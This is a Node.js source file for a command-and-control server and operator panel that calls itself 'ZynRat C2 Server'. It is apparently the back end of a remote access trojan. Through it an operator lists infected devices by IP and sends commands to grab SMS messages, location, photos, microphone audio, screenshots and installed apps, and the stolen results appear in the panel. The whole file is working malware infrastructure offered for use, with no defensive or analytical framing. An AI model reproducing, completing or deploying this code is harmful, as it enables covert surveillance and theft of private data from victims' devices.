const WebSocket = require('ws');
const express = require('express');
const http = require('http');

const PORT = process.env.PORT || 3000;
const AUTH_KEY = 'zyn_' + Math.random().toString(36).substr(2, 16);

const clients = new Map();
const results = [];
let nextId = 1;

const app = express();
app.use(express.json());

app.get('/', (req, res) => {
  const list = [];
  for (const [id, client] of clients.entries()) {
    list.push({
      id: id,
      device: client.device || 'unknown',
      ip: client.ip || 'unknown',
      online: client.ws.readyState === WebSocket.OPEN
    });
  }

  let clientsHtml = '';
  if (list.length === 0) {
    clientsHtml = '<p>Пока нет подключений</p>';
  } else {
    for (const c of list) {
      clientsHtml += '<div class="client">' +
        '<b>#' + c.id + '</b> ' + String(c.device).substring(0, 100) + '<br>' +
        'IP: ' + c.ip + ' • ' + (c.online ? 'online' : 'offline') + '<br>' +
        '<a href="/cmd?id=' + c.id + '&cmd=/ping">/ping</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/info">/info</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/screenshot">/screenshot</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/apps">/apps</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/sms">/sms</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/location">/location</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/photo">/photo</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/mic">/mic</a>' +
        '</div>';
    }
  }

  let resultsHtml = '';
  if (results.length === 0) {
    resultsHtml = '<p>Пока нет результатов</p>';
  } else {
    for (let i = results.length - 1; i >= 0; i--) {
      const r = results[i];
      resultsHtml += '<div class="result"><b>#' + r.id + ' ' + r.cmd + '</b><br>' +
        '<pre>' + escapeHtml(String(r.result).substring(0, 2000)) + '</pre></div>';
    }
  }

  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8">' +
    '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
    '<title>ZynRat Panel</title><style>' +
    'body{font-family:monospace;background:#0a0e1a;color:#00d4ff;padding:16px;}' +
    'h1{color:#a855f7;}h2{color:#00ff41;border-bottom:1px solid #333;padding-bottom:4px;}' +
    '.client{background:#15192a;padding:12px;margin:8px 0;border-radius:8px;}' +
    '.result{background:#1a1e2a;padding:12px;margin:8px 0;border-radius:8px;border-left:3px solid #a855f7;}' +
    'pre{white-space:pre-wrap;word-wrap:break-word;color:#8899aa;font-size:12px;}' +
    'a{color:#00d4ff;text-decoration:none;margin-right:8px;}a:hover{color:#a855f7;}' +
    '.status{background:#1a3a1a;padding:8px;border-radius:6px;margin-bottom:16px;}' +
    '</style></head><body>' +
    '<h1>ZynRat Panel</h1>' +
    '<div class="status">Online: <b>' + list.filter(c => c.online).length + '</b> / ' + list.length +
    '<br>Auth: <b>' + AUTH_KEY + '</b></div>' +
    '<h2>Devices</h2>' + clientsHtml +
    '<h2>Results</h2>' + resultsHtml +
    '</body></html>');
});

function escapeHtml(s) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

app.get('/cmd', (req, res) => {
  const id = parseInt(req.query.id);
  const cmd = req.query.cmd;
  const client = clients.get(id);
  if (!client) return res.send('Device not found: #' + id);
  if (!cmd) return res.send('No cmd');
  try {
    client.ws.send(JSON.stringify({ type: 'cmd', cmd: cmd }));
    console.log('[->] #' + id + ' cmd: ' + cmd);
    res.redirect('/');
  } catch (e) {
    res.send('Error: ' + e.message);
  }
});

app.post('/cmd/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const client = clients.get(id);
  if (!client) return res.status(404).json({ error: 'not found' });
  try {
    client.ws.send(JSON.stringify({ type: 'cmd', cmd: req.body.cmd }));
    console.log('[->] #' + id + ' cmd: ' + req.body.cmd);
    res.json({ ok: true, sent: req.body.cmd });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api', (req, res) => {
  const list = [];
  for (const [id, client] of clients.entries()) {
    list.push({ id: id, device: client.device, ip: client.ip, online: client.ws.readyState === WebSocket.OPEN });
  }
  res.json({ server: 'ZynRat', online: list.filter(c => c.online).length, total: list.length, authKey: AUTH_KEY, clients: list, results: results.slice(-20) });
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  const id = nextId++;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const client = { ws: ws, ip: ip, device: null, id: id };
  clients.set(id, client);
  console.log('[+] #' + id + ' from ' + ip);

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg.toString());
      if (data.type === 'hello') {
        client.device = data.device;
        console.log('[i] Device #' + id);
        ws.send(JSON.stringify({ type: 'welcome', id: id, authKey: AUTH_KEY }));
      } else if (data.type === 'result') {
        console.log('[<-] #' + id + ' result: ' + JSON.stringify(data));
        results.push({ id: data.id, cmd: data.cmd, result: data.result, time: Date.now() });
        if (results.length > 100) results.shift();
      }
    } catch (e) {
      console.log('[!] Parse error: ' + e.message);
    }
  });

  ws.on('close', () => { console.log('[-] #' + id + ' disconnected'); });
});

server.listen(PORT, () => {
  console.log('ZynRat C2 Server on port ' + PORT);
  console.log('Auth: ' + AUTH_KEY);
});
